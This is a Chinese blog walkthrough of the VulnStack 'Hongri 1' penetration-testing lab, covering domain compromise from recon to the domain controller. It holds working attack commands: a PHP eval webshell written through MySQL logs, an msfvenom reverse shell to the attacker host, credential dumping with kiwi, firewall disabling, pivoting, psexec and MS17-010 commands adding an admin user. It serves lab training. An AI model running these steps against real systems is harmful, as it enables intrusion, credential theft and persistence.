---
title: VulnStack-红日1
author: Creexile
date: 2024-05-02
lastMod: 2025-12-08
summary: 'cs,一种多人线上活动平台'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [Kali, MSF, CS, 内网, 渗透]
---

# vulnstack红队1

**拍快照,拍快照,拍快照!**

新增两个虚拟网络:
`192.168.52.0/24` 内网环境(Vmnet1)
`192.168.72.0/24` 外网环境(Vmnet2)

靶机初始密码均为`hongrisec@2019`; 当win7可以ping通所有ip地址, 环境就配置完成了

- kali: `192.168.72.128`
- Windows7 x64: `192.168.72.129`, `192.168.52.143`
  > 密码更换为`hongrisec@2024`, 记得开启php
- Windows Server 2008 R2 x64: `192.168.52.138`
  > 密码更换为`hongrisec@2024`
- Win2K3 Metasploitable 配置如下图: `192.168.52.130`

![image-20240502175114484](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502175114484.png)

虽然因为配置是可以直接攻击域控的,但是题目本来是不行的,所以还是根据给的图来进行攻击

![image-20240502102611922](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502102611922.png)

## 外网渗透

### 主机发现

进行nmap扫描后可以得到自己的主机和在外网的主机`192.168.72.129`
同时可以得到目标开放了80和3306端口, 先访问看看吧

```
nmap 192.168.72.0/24
// 当然还有什么 nmap -sU -p137 192.168.72.0/24 -T4 等
```

### 信息收集

用浏览器访问目标网页,发现是一个phpStudy探针, 里面有大量敏感信息

```
绝对路径 C:/phpStudy/WWW
Apache/2.4.23,  PHP/5.4.45
可以直接执行 phpinfo();
MySQL数据库,  SQLite/3.8.10.2
```

### 目录扫描

利用`dirsearch`进行扫描, 可以得到`phpMyadmin`的目录信息
尝试登录, 发现是弱密码, 账号密码都为root

![222](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428183649795.png)

更换字典可以扫描到备份文件 (此处shell是因为已通过phpMyadmin进行getshell)

![image-20240428184343918](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184343918.png)

### 漏洞利用

- phpMyadmin

查询`secure_file_priv`属性, 发现为NULL, 采用日志写马

```sql
show variables like '%general%';	// 查询日志状态
SET GLOBAL general_log='on'; SHOW VARIABLES LIKE '%general%';	// 开启日志读写
SET GLOBAL general_log_file='C:/phpStudy/WWW/shell.php'
SELECT '<?php eval($_POST["shell"]);?>'
```

然后用蚁剑连接就行,路径在网站根目录

![image-20240428182359427](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428182359427.png)

- yxcms

通过查看下载下来的备份文件可以知道这似乎是yxcms网站

![image-20240428184744713](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184744713.png)

可以访问`192.168.72.129/yxcms/`来查看首页,右侧公告信息给出了敏感信息

> 后台地址: /index.php?r=admin
>
> 用户名: admin
>
> 密码: 123456

登录后发现可以更改模板php文件,写马即可
修改`index_index.php`,直接在最上方加上一句话木马即可,随后蚁剑连接

![image-20240428190410498](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428190410498.png)

不管什么方法,getshell后利用msf进行下一步: 上传反弹shell (随意放,放启动项是习惯)

```
C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/
```

然后用msf进行监听, 蚁剑运行上传的反弹木马

```
// 生成
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.128 lport=10000  -f exe -o win2.exe
// 监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.72.128
set lport 10000
run
```

连接后进入`shell`进行内网信息收集

## 内网渗透

### 内网信息收集

- 域信息收集

乱码使用`chcp 65001`解决

```bash
whoami	# 当前权限  god\administrator
ipconfig /all	# 查看网络信息  双网卡
net user /domain	# 查看域用户 Administrator,Guest,krbtgt,ligang,liukaifeng01
net config workstation	# 查看工作站配置信息
```

![image-20240428203341439](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203341439.png)

可以看到我们处于`GOD`域内

查看arp缓存, 可以看到可能存活的主机

![image-20240428204155230](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204155230.png)

通过ping域DNS名称来查找域控主机,得到域控`192.168.52.138`

![image-20240428203752147](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203752147.png)

关闭win7防火墙

```
netsh advfirewall set allprofiles state off
```

- 密码抓取

接下来提权到system权限,利用`getsystem`即可, 可以得到Administrator的密码

```
load kiwi
creds_all	// 抓取全部
```

![image-20240428204429662](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204429662.png)

### 搭建路由和代理

先添加通向`192.168.52.0`内网的路由

```
route add 192.168.52.0 255.255.255.0 1	// 数字是会话序号
route print
```

利用msf搭建socks代理

> socks代理仅仅是为了代理工具,如果仅用msf进行操作,不需要搭建

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 5
run
```

### 横向移动

利用`fscan`进行扫描或者用`proxychains`代理扫描工具

```
fscan64.exe -h 192.168.52.130
```

![image-20240502110334723](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502110334723.png)

终究还是败给了cs的好用

首先上传cs木马, 监听和连接,这里不在赘述,记得会话**设置sleep为1**,否则等半天

- 搭建SMB Beacon

> SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发

新建监听器, 选择payload为`Beacon SMB`,随便取名,我的取名为`smb`

然后在要建立`SMB Beacon`的beacon对话框中输入`spawn [name]`
如下图,我在红色箭头的会话中输入了`spawn smb`,它的右侧就会多出来一个

![image-20240502183537269](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502183537269.png)

我发现这里连不上另一个域成员却可以直接用psexec登录域控,这下坏了

算了,就在这里结束吧,毕竟可以直接利用抓到的令牌进行psexec横向移动,给出步骤:

切换视图然后右键,选择psexec

![image-20240502194355001](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194355001.png)

然后选择令牌,令牌看上去似乎很少或者没有就去抓取明文密码和抓取hash

![image-20240502194803642](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194803642.png)

监听器就选创建的smb和新出现的会话, **注意这个OWA才是域控**,看ip分辨

![image-20240502194854310](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194854310.png)

运行即可,一般出现`established link to child beacon: ip`就算成功,ip是谁创建的会话就是谁,不放心可以用`shell ipconfig`验证

如下,原来的图新增一个会话,然后ip也正确,我们已经拿下域控了

![image-20240502195104610](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502195104610.png)

> 下面都是乱走的路,在此处没用
>
> 假如你想看全程用msf利用psexec登录域控的,去看`vulnstack红队5`,但是msf不是很稳定

利用telnet攻击:

开放了445端口,扫出了MS17-010漏洞,尝试利用(换了好几个payload,这个行,可能是才疏学浅)

```
use auxiliary/admin/smb/ms17_010_command
set command net user		// 此处为要执行的命令
set rhost 192.168.52.130
run
```

可以执行命令就可以转变为建立一个用户然后用telnet连接或者利用3389远程连接

> 虽然telnet只能上传文件不能执行,但是可以通过msf执行然后反弹shell
> 再或者利用msf的模块直接建立会话

```
set command net user test hack@2024 /add		// 新建用户,密码不能太简单,不能包含用户名
set command net localgroup administrators test /add		// 加入管理员组,最好再看一眼用户列表
set command sc config tlntsvr start= auto		// 打开telnet服务
set command net start telnet		// 启动
set command netstat -an		// 查看端口开启(23)
```

![image-20240502120731187](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502120731187.png)

尝试msf的telnet模块连接

```
use auxiliary/scanner/telnet/telnet_login
set rhosts 192.168.52.130
set username test
set password hack@2024
run
```

![image-20240502123330580](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502123330580.png)

连接后这个session似乎不能执行命令,我猜测是因为这个模块是针对linux的,因为在尝试利用python,python3,script,socat等等进行会话建立

手动进行telnet连接

```
proxychains telnet 192.168.52.130
```
